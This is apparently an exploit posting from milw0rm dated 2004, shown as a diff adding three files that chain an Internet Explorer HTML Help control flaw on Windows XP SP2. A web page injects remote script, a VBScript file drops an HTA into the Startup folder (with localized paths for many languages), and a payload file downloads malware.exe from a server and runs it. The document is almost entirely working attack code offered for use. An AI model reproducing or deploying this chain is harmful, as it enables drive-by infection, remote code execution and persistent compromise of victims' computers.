@@ -1,0 +1,80 @@
+//  sp2rc.htm  //
+
+<OBJECT id="localpage" type="application/x-oleobject" 
+classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" height=7%
+style="position:absolute;top:140;left:72;z-index:100;" 
+codebase="hhctrl.ocx#Version=5,2,3790,1194" width="7%">
+<PARAM name="Command" value="Related Topics, MENU">
+<PARAM name="Button" value="Text:Just a button">
+<PARAM name="Window" value="$global_blank">
+<PARAM name="Item1" value="command;file://C:\WINDOWS\
+PCHealth\HelpCtr\System\blurbs\tools.htm">
+</OBJECT>
+
+<OBJECT id="inject" type="application/x-oleobject"
+classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" height=7%
+style="position:absolute;top:140;left:72;z-index:100;"
+codebase="hhctrl.ocx#Version=5,2,3790,1194" width="7%">
+<PARAM name="Command" value="Related Topics, MENU">
+<PARAM name="Button" value="Text:Just a button">
+<PARAM name="Window" value="$global_blank">
+<PARAM name="Item1" value='command;javascript:
+execScript("document.write(\"<script language=\\\"vbscript\\\"
+src=\\\"http://site/writehta.txt\\\"\"+String.fromCharCode(62)+\"
+</scr\"+\"ipt\"+String.fromCharCode(62))")'>
+</OBJECT>
+
+<script>
+localpage.HHClick();
+setTimeout("inject.HHClick()",100);
+</script>
+
+//  writehta.txt  //
+
+Dim Conn, rs
+Set Conn = CreateObject("ADODB.Connection")
+Conn.Open "Driver={Microsoft Text Driver (*.txt; *.csv)};" & _
+"Dbq=http://server;" & _
+"Extensions=asc,csv,tab,txt;" & _
+"Persist Security Info=False"
+Dim sql
+sql = "SELECT * from foobar.txt"
+set rs = conn.execute(sql)
+set rs =CreateObject("ADODB.recordset")
+rs.Open "SELECT * from foobar.txt", conn
+rs.Save
+"C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Microsoft Office.hta", adPersistXML
+// Spanish     \Documents and Settings\All Users\Menu Inicio\Programas\Inicio\
+// French       \Documents and Settings\All Users\Menu Démarrer\Programmes\Démarrage
+// Danish      \Documents and Settings\All Users\Menuen Start\Programmer\Start\
+// Dutch        \Documents and Settings\All Users\Menu Start\Programma's\Opstarten\
+// Polish        \Documents and Settings\All Users\Menu Start\Programy\Autostart\
+// Italian       \Documents and Settings\All Users\Menu Avvio\Programmi\Esecuzione automatica\
+// Finn           \Documents and Settings\All Users\Kaynnista-valikko\Ohjelmat\Kaynnistys\
+// Turkish      \Documents and Settings\All Users\Start Menu\Programlar\BASLANGIC\ Turkish
+// Norwegian  \Documents and Settings\All Users\Start-meny\Programmer\Oppstart\
+// Swedish     \Documents and Settings\All Users\Start-menyn\Program\Autostart\
+// Portuguese \Documents and Settings\All Users\Menu Iniciar\Programas\Iniciar\
+// German     \Dokumente und Einstellungen\All Users\Startmenu\Programme\Autostart\
+rs.close
+conn.close
+window.close
+
+//  f00bar.txt  //
+
+"meaning less shit i had to put here"
+"<script language=vbscript> crap = """
+""": on error resume next: crap = """
+""" : set o = CreateObject(""msxml2.XMLHTTP"") : crap="""
+""" : o.open ""GET"",""http://server/malware.exe"",False : crap="""
+""" : o.send : crap="""
+""" : set s = createobject(""adodb.stream"") : crap="""
+""" : s.type=1 : crap="""
+""" : s.open : crap="""
+""" : s.write o.responseBody : crap="""
+""" : s.savetofile ""C:\malware.exe"",2 : crap="""
+""" : Set ws = CreateObject(""WScript.Shell"") : crap="""
+""" : ws.Run ""C:\malware.exe"", 3, FALSE : crap="""
+"""</script> crap="""
+
+# milw0rm.com [2004-12-25]
